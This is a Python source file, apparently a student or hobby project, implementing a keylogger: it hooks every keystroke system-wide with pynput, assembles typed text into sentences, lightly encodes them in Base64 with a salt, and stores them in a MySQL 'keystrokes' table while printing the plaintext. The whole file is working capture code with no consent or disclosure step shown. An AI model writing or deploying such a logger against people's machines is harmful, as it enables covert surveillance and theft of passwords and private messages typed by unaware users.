# logger_sentences.py

import os
import base64
from mysql.connector import Error
from pynput import keyboard
from db_connector import connect_to_db
from src.decoding_example import retrieve_and_decode_key

current_sentence = ""
shift_pressed = False


def generate_salt(length=8):
    # Generate a random salt of the specified length
    return os.urandom(length)


def log_sentence(sentence):
    connection = connect_to_db()
    if connection:
        cursor = connection.cursor()
        try:
            # Encode the sentence string as Base64
            sentence_bytes = sentence.encode('utf-8')
            sentence_base64 = base64.b64encode(sentence_bytes).decode('utf-8')

            # Optionally, you could append a salt to the Base64 string
            salt = generate_salt()
            salt_base64 = base64.b64encode(salt).decode('utf-8')
            salted_sentence = f"{sentence_base64}:{salt_base64}"

            # Insert the result into the database as a TEXT field
            sql_query = "INSERT INTO keystrokes (key_pressed) VALUES (%s)"
            cursor.execute(sql_query, (salted_sentence,))

            # Commit the transaction
            connection.commit()

            # Optional: Add debugging print statements if needed
            print(f"Logged Sentence: {sentence}")
            print(f"Salted and Encoded Sentence: {salted_sentence}")

            retrieve_and_decode_key(salted_sentence)

        except Error as e:
            print("Failed to insert data into MySQL table", e)
        finally:
            cursor.close()
            connection.close()


def on_press(key):
    global current_sentence, shift_pressed

    try:
        if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
            shift_pressed = True
        elif key == keyboard.Key.space:
            current_sentence += " "
        elif key == keyboard.Key.backspace:
            current_sentence = current_sentence[:-1]  # Remove the last character
        elif key == keyboard.Key.enter:
            log_sentence(current_sentence)
            current_sentence = ""  # Reset the current sentence
        elif hasattr(key, 'char'):  # Check if the key is a character key
            if key.char:
                if shift_pressed and key.char.isalpha():
                    current_sentence += key.char.upper()
                elif key.char == '.' or key.char == '!' or key.char == '?':
                    log_sentence(current_sentence)
                    current_sentence = ""  # Reset the current sentence`
                else:
                    current_sentence += key.char
    except AttributeError:
        # Handle other special keys like arrow keys, function keys, etc.
        pass


def on_release(key):
    global shift_pressed

    if key == keyboard.Key.shift or key == keyboard.Key.shift_r:
        shift_pressed = False

    if key == keyboard.Key.esc:
        # Log the current sentence if ESC is pressed and the sentence is not empty
        if current_sentence:
            log_sentence(current_sentence)
        return False  # Stop listener
